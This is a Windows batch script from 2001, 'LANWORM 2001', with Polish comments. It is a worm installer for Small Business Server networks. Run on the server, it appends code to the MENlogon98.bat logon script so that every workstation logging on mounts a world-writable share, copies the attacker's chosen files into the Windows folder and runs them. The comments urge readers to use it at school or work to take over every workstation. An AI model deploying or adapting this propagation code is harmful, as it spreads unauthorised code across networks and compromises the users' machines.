@echo off
ECHO.
ECHO  ---------------------------------
ECHO  -=- LANWORM 2001 -=- by OOZIE -=-
ECHO  ---------------------------------
ECHO.
REM )----------------------------------------------------------------------(
REM ) LanWORM Project                                      OOZIE III.2001  (
REM ) ~~~~~~~~~~~~~~~                                      ~~~~~~~~~~~~~~  (
REM ) Nie wiesz jak wykorzystac SBS w twojej szkole/pracy/uczelni?         (
REM ) Uruchom ten plik na serwerze. Dopisze odpowiednia wstawke do skryptu (
REM ) logujacego MenLogon98.bat, przez co *KAZDA* stacja robocza, z ktorej (
REM ) ktos loguje sie na SBS moze zostac zdominowana!                      (
REM )                                                        Powodzonka :) (
REM )----------------------------------------------------------------------(

REM -=================== DEKLARACJA DANYCH ================================-
REM -- Ustawianie zmiennych srodowiskowych. Wszystkie ustawienia sa domyslne 
REM -- i powinny dzialac w 90% przypadkow. Nie dziala? Drop me a letter!
REM --                                         oozie@hackpospolita.prv.pl

SET MENLOGON=C:\WINNT.SBS\System32\Repl\Import\Scripts\MENlogon98.bat
REM -- Ustalanie sciezki do pliku MENlogon98.bat na serwerze. To nasz cel :D

SET WormFiles=DEMO.BAT
REM -- Tutaj pliki, ktore chcemy na stacjach roboczych uruchomic. Zmien wg. 
REM -- upodoban. Ja wrzucilem efekt mordki z wystawionym jezorem :P zadnych
REM -- szkodliwych efektow - 100% harmless ;)

SET W98SETP=C:\WINNT.SBS\SETUP\W98SETUP
REM -- Sciezka na serwerze do katalogu, widzianego ze stacji roboczych jako
REM -- \\MEN01\W98SETP$ - default - mamy tam dostep r/w dla kazdego!
REM ---------------------------
SET DSK=L:
REM ---------------------------
SET MOUNT=NET USE %DSK% \\MEN01\w98setp$
REM ---------------------------
SET UMOUNT=NET USE %DSK% /DELETE
REM ---------------------------
REM -================= MODYFIKACJA PLIKU MENLOGON ======================-

IF NOT EXIST %MENLOGON% GOTO ERROR
FIND "LANWORM" %MENLOGON%>NUL
FOR %%F IN (%WormFiles%) DO IF NOT EXIST %%F GOTO ERROR

IF NOT ERRORLEVEL 1 GOTO FOUND

:NOTFOUND
ECHO  [*] Nie znalazlem wpisu w Menlogon.bat... 
ECHO               Czas go dodac ;)
ECHO REM --- LANWORM START ---                          >> %MENLOGON%
ECHO :SYN                                               >> %MENLOGON%
ECHO CD %%WINDIR%%                                      >> %MENLOGON%
ECHO FOR %%%%W IN (%WormFiles%) DO IF NOT EXIST %%%%W GOTO REP >> %MENLOGON%
ECHO GOTO RST                                           >> %MENLOGON%
ECHO :REP                                               >> %MENLOGON% 
ECHO %MOUNT%                                            >> %MENLOGON%
ECHO CD %%WINDIR%%                                        >> %MENLOGON%
ECHO FOR %%%%K IN (%WormFiles%) DO IF NOT EXIST %%%%K COPY %DSK%\%%%%K %%%%K>> %MENLOGON%
ECHO %UMOUNT%                                           >> %MENLOGON%
ECHO :RST                                               >> %MENLOGON%
ECHO CD %%WINDIR%%                                        >> %MENLOGON%
ECHO FOR %%%%E IN (%WormFiles%) DO %%%%E                >> %MENLOGON%
ECHO REM --- LANWORM KONIEC ---                         >> %MENLOGON%

REM -================= KOPIOWANIE PLIKOW WormFiles ======================-

IF NOT EXIST %W98SETP%\win98img.zip GOTO ERROR
FOR %%K IN (%WormFiles%) DO COPY %%K %W98SETP%\%%K>NUL

GOTO FOUND

:ERROR

ECHO  [-] Nie odnalazlem niezbednego pliku lub katalogu :P Nic z tego!

GOTO KONIEC
:FOUND

FOR %%T IN (%WormFiles%) DO IF NOT EXIST %W98SETP%\%%T SET TEST=:(
FIND "LANWORM" %MENLOGON%>NUL

IF ERRORLEVEL 2 SET TEST=:(
IF ERRORLEVEL 1 SET TEST=:(
IF "%TEST%" == ":(" ECHO  [-] Wystapil blad. Lanworm nie zainstalowany :P
IF NOT "%TEST%" == ":(" ECHO  [+] LanWorm zainstalowany na serwerze :)
:KONIEC
REM -================= CZYSZCZENIE ZMIENNYCH SRODOWISKOWYCH ===============-

SET DSK=
SET TEST=
SET MOUNT=
SET UMOUNT=
SET W98SETP=
SET MENLOGON=
SET WormFiles=

echo.
                  
REM -- TU QNIEC --
